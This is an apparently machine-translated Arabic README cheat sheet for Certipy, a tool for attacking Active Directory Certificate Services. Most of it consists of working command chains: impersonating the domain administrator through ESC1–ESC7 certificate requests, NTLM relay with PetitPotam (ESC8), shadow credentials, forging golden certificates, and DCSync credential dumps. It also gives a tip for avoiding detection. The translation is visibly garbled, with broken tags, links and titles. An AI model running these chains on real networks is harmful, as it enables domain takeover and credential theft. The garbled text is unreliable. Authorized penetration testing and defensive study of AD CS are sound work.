<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ شهادة - ورقة غش كاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</ص>

<p align="center">
  <b>🔑 أداة شاملة لتعداد واستغلال التكوينات الخاطئة لخدمات شهادات Active Directory (AD CS)</b>
</ص>

---

## 📋 جدول المحتويات

- [المقدمة](#-المقدمة)
- [لماذا إساءة استخدام AD CS؟](#-why-ad-cs-abuse)
- [التثبيت](#-التثبيت)
- [نظرة عامة على الأوامر الفرعية للشهادة](#-نظرة عامة على الأوامر الفرعية للشهادة)
- [التعداد والاكتشاف (`find`)](#-التعداد--الاكتشاف-البحث)
- [مصفوفة الضعف ESC](#-مصفوفة الضعف-esc)
  - [ESC1: الاسم البديل لموضوع مستلزمات المسجل (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: EKU أو SubCA لأي غرض](#esc2-any- Purpose-eku-or-subca)
  - [ESC3: وكيل طلب الشهادة](#esc3-certificate-request-agent)
  - [ESC4: التحكم في الوصول إلى القالب الضعيف (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: تم تمكين EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: التحكم في الوصول إلى CA الضعيف](#esc7-vulnerable-ca-access-control)
  - [ESC8: NTLM Relay to HTTP Web Enrollment](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 وESC10: عيوب قوية في تعيين الشهادات](#esc9--esc10-strong-certificate-mapping-flaws)
- [بيانات اعتماد الظل (`shadow`)](#-أوراق اعتماد الظل-الظل)
- [الشهادات الذهبية (`forge`)](#-الشهادات الذهبية-تزوير)
- [المصادقة باستخدام PFX (`auth`)](#-authenticating-with-pfx-auth)
- [سير عمل الهجوم في العالم الحقيقي](#-سير عمل الهجوم في العالم الحقيقي)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [النصائح وأفضل الممارسات](#-نصائح--أفضل-الممارسات)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 المقدمة

**Certipy** (التي أنشأها Oliver Lyak) هي الأداة الرائدة المستندة إلى Python لتعداد واستغلال خدمات شهادات Active Directory (**AD CS**). AD CS هو تطبيق Microsoft للبنية التحتية للمفتاح العام (PKI) لشبكات Active Directory الخاصة بالمؤسسات، ويستخدم على نطاق واسع لتسجيل الدخول بالبطاقة الذكية، وشبكات VPN، وS/MIME، وتشفير TLS الداخلي.

نظرًا لأن التكوينات الخاطئة للشهادة تسمح في كثير من الأحيان لمستخدمي المجال غير المميزين بطلب الشهادات كمسؤولي المجال أو وحدات التحكم بالمجال، فإن إساءة استخدام AD CS تمثل أحد أكثر ناقلات تصعيد المجال موثوقية وتأثيرًا في اختبارات اختراق المؤسسات الحديثة.

---

## ⚖️ لماذا إساءة استخدام AD CS؟

- ⚡ **التصعيد الفوري للنطاق:** غالبًا ما تمنح قوالب الشهادات التي تم تكوينها بشكل خاطئ تسوية على مستوى النطاق في ثوانٍ.
- 🔑 **متخفية ومستمرة:** يمكن أن تظل الشهادات المسروقة أو الشهادات الذهبية المزورة صالحة لسنوات دون تشغيل تنبيهات تغيير كلمة المرور القياسية.
- 🔄 **PKINIT إلى NT Hash:** يقوم Certipy بمصادقة شهادات `.pfx` المطلوبة عبر Kerberos PKINIT، واسترداد تجزئة النص العادي للهدف مباشرة من KDC.

---

## 📥 التثبيت

### استخدام pipx (مستحسن)
```bash
pipx install certipy-ad
```
### من مستودع جيثب
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### تَحَقّق
```bash
certipy -h
```
---

## 🧭 نظرة عامة على أوامر الشهادة الفرعية

| أمر فرعي | وظيفة |
|------------|----------|
| `find` | تعداد المراجع المصدقة والقوالب واكتشاف ثغرات ESC |
| `req` | طلب شهادات من القوالب الضعيفة |
| `auth` | قم بالمصادقة باستخدام شهادات `.pfx` لاسترداد تجزئة TGT وNT |
| `ca` | تعداد وتعديل إعدادات تكوين CA |
| `template` | تعديل إعدادات قالب الشهادة (مفيدة في ESC4) |
| `account` | إدارة حسابات كمبيوتر Active Directory (MachineAccountQuota) |
| `shadow` | استغلال بيانات اعتماد الظل (`msDS-KeyCredentialLink`) |
| `forge` | تزوير الشهادات الذهبية باستخدام مفتاح CA الخاص المسروق |

---

## 🔍 التعداد والاكتشاف (`find`)

ابدأ بتحديد مرجع تصديق المؤسسة (CA) والمسح بحثًا عن القوالب المعرضة للخطر:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 مصفوفة الضعف ESC

### ESC1: الاسم البديل للموضوع (SAN) لمستلزمات المسجل

**الحالة:**
- يتمتع المستخدمون ذوو الامتيازات المنخفضة بحقوق التسجيل (تم تمكين `Client Authentication` EKU).
- يحدد القالب `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (يسمح للطالب بتحديد أي اسم بديل للموضوع، مثل مسؤول المجال).

**استغلال:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*ينتج عن الإخراج TGT الخاص بالمسؤول والنص العادي NT Hash!*

---

### ESC2: EKU أو SubCA لأي غرض

**الحالة:**
- يحدد القالب `Any Purpose` EKU أو لا يحتوي على EKU محدد.
- يمكن استخدامها لأي غرض، بما في ذلك مصادقة العميل.

**الاستغلال:**
يتم استغلاله بشكل مماثل لـ ESC1 أو يتم استخدامه مع ESC3 للحصول على شهادة وكيل التسجيل.

---

### ESC3: وكيل طلب الشهادة

**الحالة:**
- يحتوي القالب على `Certificate Request Agent` EKU (وكيل التسجيل).
- يسمح بطلب الشهادات نيابة عن مستخدم آخر عبر القوالب الثانوية.

**استغلال:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: التحكم في الوصول إلى القالب الضعيف (ACL)

**الحالة:**
- يتمتع المستخدم ذو الامتيازات المنخفضة بحقوق `WriteOwner` أو `WriteDacl` أو `WriteProperty` في قالب الشهادة.

**استغلال:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: تم تمكين EDITF_ATTRIBUTESUBJECTALTNAME2

**الحالة:**
- يحتوي CA على مجموعة علامات `EDITF_ATTRIBUTESUBJECTALTNAME2`، مما يسمح لأي طلب شهادة بتحديد شبكات SAN عشوائية بغض النظر عن إعدادات القالب!

**استغلال:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: التحكم في الوصول إلى CA الضعيف

**الحالة:**
- يتمتع المستخدم بحقوق `ManageCA` أو `ManageCertificates` على المرجع المصدق (CA) نفسه.

**استغلال:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: ترحيل NTLM إلى تسجيل ويب HTTP

**الحالة:**
- يتمتع المرجع المصدق (CA) بنقطة نهاية HTTP لتسجيل الويب (`/certsrv/`) التي تم تمكينها مع مصادقة NTLM بدون EPA (الحماية الموسعة للمصادقة) وHTTPS.

** سير عمل الاستغلال: **
1. ابدأ `ntlmrelayx` بالإشارة إلى CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. قم بتشغيل مصادقة الآلة القسرية عبر PetitPotam أو PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. يقوم `ntlmrelayx` بترحيل مصادقة NTLM لحساب جهاز DC، ويطلب شهادة كمبيوتر، ويخرج base64 `.pfx`.
4. قم بالمصادقة كوحدة تحكم بالمجال باستخدام Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. استخدم تجزئة NT الخاص بـ DC لإجراء تفريغ DCSync كامل باستخدام `impacket-secretsdump`.

---

## 👥 بيانات اعتماد الظل (`shadow`)

إذا كان الحساب المخترق لديه حق الوصول للكتابة عبر سمة `msDS-KeyCredentialLink` الخاصة بحساب آخر:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 الشهادات الذهبية (`forge`)

إذا قمت باختراق CA واستخرجت مفتاحه الخاص:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 المصادقة باستخدام PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 سير عمل الهجوم الواقعي

### أكمل عملية الاستيلاء على مجال ESC1 في 3 أوامر
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 جدول مرجعي سريع

| مهمة | الأمر |
|------|---------|
| **تعداد AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **طلب الشهادة (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **مصادقة PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **تعديل القالب (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| ** بيانات اعتماد الظل ** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **إدارة حقوق CA** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **تزوير الشهادة الذهبية** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 النصائح وأفضل الممارسات

1. **تحقق من مزامنة ساعة DC:**
   يتطلب Kerberos PKINIT مزامنة وقت النظام الخاص بك خلال 5 دقائق من وحدة تحكم المجال. يجري:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **التعامل مع KDC_ERR_PADATA_TYPE_NOSUPP:**
   إذا فشل `certipy auth` بسبب هذا الخطأ، فهذا يعني أن وحدة تحكم المجال ليس لديها شهادة وحدة تحكم مجال صالحة مثبتة لـ PKINIT. في هذه الحالة، استخدم مصادقة LDAP أو SChannel.
3. **قم دائمًا بتنظيف قوالب ESC4:**
   عند تغيير قوالب الشهادات، احتفظ دائمًا بتكوين النسخ الاحتياطي وأعد تطبيقه (`-configuration <FILE>.json`) لتجنب ترك البيئة معرضة للخطر أو التسبب في انقطاع التشغيل.

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** تمنح هجمات خدمات شهادات Active Directory وصولاً إداريًا حاسمًا وعالي التأثير عبر شبكات المجال. يجب تنفيذ Certipy فقط أثناء اختبارات الاختراق المصرح بها، وتمارين الفريق الأحمر، وعمليات تدقيق الأمان الأخلاقي بإذن كتابي.

---

## 📚 المصادر

- [مستودع شهادة GitHub الرسمي](https://github.com/ly4k/Certipy)
- [الورقة البيضاء المعتمدة للسيارات المستعملة (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [مسارات هجوم AD CS وعمليات الحماية (أوليفر لياك)](https://posts.specterops.io/certified-pre-OWN-d95910965cd2)